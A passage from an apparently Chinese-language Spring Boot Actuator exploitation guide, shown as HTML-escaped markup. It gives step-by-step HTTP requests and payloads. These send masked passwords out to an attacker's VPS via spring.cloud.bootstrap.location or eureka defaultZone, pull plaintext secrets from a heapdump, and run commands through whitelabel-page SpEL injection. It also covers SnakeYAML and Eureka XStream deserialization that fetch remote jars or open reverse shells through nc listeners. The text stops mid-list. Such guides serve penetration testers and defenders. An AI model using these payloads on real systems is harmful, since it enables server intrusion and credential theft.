&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;

&lt;h5 id=&quot;步骤二-使用-nc-监听-http-请求-1&quot;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/h5&gt;

&lt;p&gt;在自己控制的外网服务器上监听 80 端口：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvk&lt;/span&gt; 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤三-触发对外-http-请求&quot;&gt;步骤三： 触发对外 http 请求&lt;/h5&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring.cloud.bootstrap.location&lt;/code&gt; 方法（&lt;strong&gt;同时适用于&lt;/strong&gt;明文数据中有特殊 url 字符的情况）：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/?=${security.user.password}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
Content-Type: application/json

{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/?=${security.user.password}&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eureka.client.serviceUrl.defaultZone&lt;/code&gt; 方法（&lt;strong&gt;不适用于&lt;/strong&gt;明文数据中有特殊 url 字符的情况）：&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/${security.user.password}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
Content-Type: application/json

{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/${security.user.password}&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤四-刷新配置-1&quot;&gt;步骤四： 刷新配置&lt;/h5&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
Content-Type: application/x-www-form-urlencoded

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
Content-Type: application/json

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;0x06获取被星号脱敏的密码的明文-方法四&quot;&gt;0x06：获取被星号脱敏的密码的明文 (方法四)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;利用条件-3&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;可正常 GET 请求目标 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/heapdump&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/heapdump&lt;/code&gt; 接口&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法-3&quot;&gt;利用方法：&lt;/h4&gt;

&lt;h5 id=&quot;步骤一-找到想要获取的属性名-3&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;

&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;

&lt;h5 id=&quot;步骤二-下载-jvm-heap-信息&quot;&gt;步骤二： 下载 jvm heap 信息&lt;/h5&gt;

&lt;blockquote&gt;
  &lt;p&gt;下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; 请求目标的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/heapdump&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/heapdump&lt;/code&gt; 接口，下载应用实时的 JVM 堆信息&lt;/p&gt;

&lt;h5 id=&quot;步骤三-使用-mat-获得-jvm-heap-中的密码明文&quot;&gt;步骤三： 使用 MAT 获得 jvm heap 中的密码明文&lt;/h5&gt;

&lt;p&gt;参考 &lt;a href=&quot;https://landgrey.me/blog/16/&quot;&gt;文章&lt;/a&gt; 方法，使用 &lt;a href=&quot;https://www.eclipse.org/mat/downloads.php&quot;&gt;Eclipse Memory Analyzer&lt;/a&gt; 工具的 OQL 语句 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select * from org.springframework.web.context.support.StandardServletEnvironment&lt;/code&gt;， 辅助快速过滤分析，获得密码明文&lt;/p&gt;

&lt;h2 id=&quot;二远程代码执行&quot;&gt;二：远程代码执行&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;0x01whitelabel-error-page-spel-rce&quot;&gt;0x01：whitelabel error page SpEL RCE&lt;/h3&gt;

&lt;h4 id=&quot;利用条件-4&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0&lt;/li&gt;
  &lt;li&gt;至少知道一个触发 springboot 默认错误页面的接口及参数名&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法-4&quot;&gt;利用方法：&lt;/h4&gt;

&lt;h5 id=&quot;步骤一找到一个正常传参处&quot;&gt;步骤一：找到一个正常传参处&lt;/h5&gt;

&lt;p&gt;比如发现访问  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/article?id=xxx&lt;/code&gt; ，页面会报状态码为 500 的错误： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Whitelabel Error Page&lt;/code&gt;，则后续 payload 都将会在参数 id 处尝试。&lt;/p&gt;

&lt;h5 id=&quot;步骤二执行-spel-表达式&quot;&gt;步骤二：执行 SpEL 表达式&lt;/h5&gt;

&lt;p&gt;输入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/article?id=${7*7}&lt;/code&gt; ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。&lt;/p&gt;

&lt;p&gt;由字符串格式转换成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x**&lt;/code&gt; java 字节形式，方便执行任意代码：&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# coding: utf-8
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'open -a Calculator'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;,&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;执行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open -a Calculator&lt;/code&gt; 命令&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x65&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x63&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x75&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x72&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}))}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;漏洞原理&quot;&gt;漏洞原理：&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;spring boot 处理参数值出错，流程进入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.util.PropertyPlaceholderHelper&lt;/code&gt; 类中&lt;/li&gt;
  &lt;li&gt;此时 URL 中的参数值会用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parseStringValue&lt;/code&gt; 方法进行递归解析&lt;/li&gt;
  &lt;li&gt;其中  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;${}&lt;/code&gt;  包围的内容都会被 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration&lt;/code&gt; 类的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolvePlaceholder&lt;/code&gt; 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;漏洞分析&quot;&gt;漏洞分析：&lt;/h4&gt;

&lt;p&gt;​	&lt;a href=&quot;https://www.cnblogs.com/litlife/p/10183137.html&quot;&gt;SpringBoot SpEL表达式注入漏洞-分析与复现&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;漏洞环境&quot;&gt;漏洞环境：&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce&quot;&gt;repository/springboot-spel-rce&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;正常访问：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9091/article?id=66
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;执行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open -a Calculator&lt;/code&gt; 命令：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;http:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;0x02spring-cloud-snakeyaml-rce&quot;&gt;0x02：spring cloud SnakeYAML RCE&lt;/h3&gt;

&lt;h4 id=&quot;利用条件-5&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
  &lt;li&gt;目标依赖的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-cloud-starter&lt;/code&gt; 版本 &amp;lt; 1.3.0.RELEASE&lt;/li&gt;
  &lt;li&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法-5&quot;&gt;利用方法：&lt;/h4&gt;

&lt;h5 id=&quot;步骤一-托管-yml-和-jar-文件&quot;&gt;步骤一： 托管 yml 和 jar 文件&lt;/h5&gt;

&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;

python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在网站根目录下放置后缀为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yml&lt;/code&gt; 的文件  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.yml&lt;/code&gt;，内容如下：&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;!!javax.script.ScriptEngineManager&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;!!java.net.URLClassLoader&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[[&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;!!java.net.URL&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://your-vps-ip/example.jar&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;]]&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在网站根目录下放置后缀为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jar&lt;/code&gt; 的文件  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.jar&lt;/code&gt;，内容是要执行的代码，代码编写及编译方式参考 &lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;yaml-payload&lt;/a&gt;。&lt;/p&gt;

&lt;h5 id=&quot;步骤二-设置-springcloudbootstraplocation-属性&quot;&gt;步骤二： 设置 spring.cloud.bootstrap.location 属性&lt;/h5&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
Content-Type: application/json

{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤三-刷新配置&quot;&gt;步骤三： 刷新配置&lt;/h5&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
Content-Type: application/x-www-form-urlencoded

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
Content-Type: application/json

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;漏洞原理-1&quot;&gt;漏洞原理：&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址&lt;/li&gt;
  &lt;li&gt;refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容&lt;/li&gt;
  &lt;li&gt;SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作&lt;/li&gt;
  &lt;li&gt;先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件&lt;/li&gt;
  &lt;li&gt;然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化&lt;/li&gt;
  &lt;li&gt;实例化类时执行恶意代码，造成 RCE 漏洞&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;漏洞分析-1&quot;&gt;漏洞分析：&lt;/h4&gt;

&lt;p&gt;​	&lt;a href=&quot;https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/&quot;&gt;Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;漏洞环境-1&quot;&gt;漏洞环境：&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce&quot;&gt;repository/springcloud-snakeyaml-rce&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;正常访问：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9092/env
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;0x03eureka-xstream-deserialization-rce&quot;&gt;0x03：eureka xstream deserialization RCE&lt;/h3&gt;

&lt;h4 id=&quot;利用条件-6&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
  &lt;li&gt;目标使用的  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eureka-client&lt;/code&gt; &amp;lt; 1.8.7（通常包含在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-cloud-starter-netflix-eureka-client&lt;/code&gt; 依赖中）&lt;/li&gt;
  &lt;li&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法-6&quot;&gt;利用方法：&lt;/h4&gt;

&lt;h5 id=&quot;步骤一架设响应恶意-xstream-payload-的网站&quot;&gt;步骤一：架设响应恶意 XStream payload 的网站&lt;/h5&gt;

&lt;p&gt;提供一个依赖 Flask 并符合要求的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py&quot;&gt;python 脚本示例&lt;/a&gt;，作用是利用目标 Linux 机器上自带的 python 来反弹shell。&lt;/p&gt;

&lt;p&gt;使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。&lt;/p&gt;

&lt;h5 id=&quot;步骤二监听反弹-shell-的端口&quot;&gt;步骤二：监听反弹 shell 的端口&lt;/h5&gt;

&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤三设置-eurekaclientserviceurldefaultzone-属性&quot;&gt;步骤三：设置 eureka.client.serviceUrl.defaultZone 属性&lt;/h5&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
Content-Type: application/json

{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤四刷新配置&quot;&gt;步骤四：刷新配置&lt;/h5&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
Content-Type: application/x-www-form-urlencoded

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
Content-Type: application/json

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;漏洞原理-2&quot;&gt;漏洞原理：&lt;/h4&gt;

&lt;ol&gt;
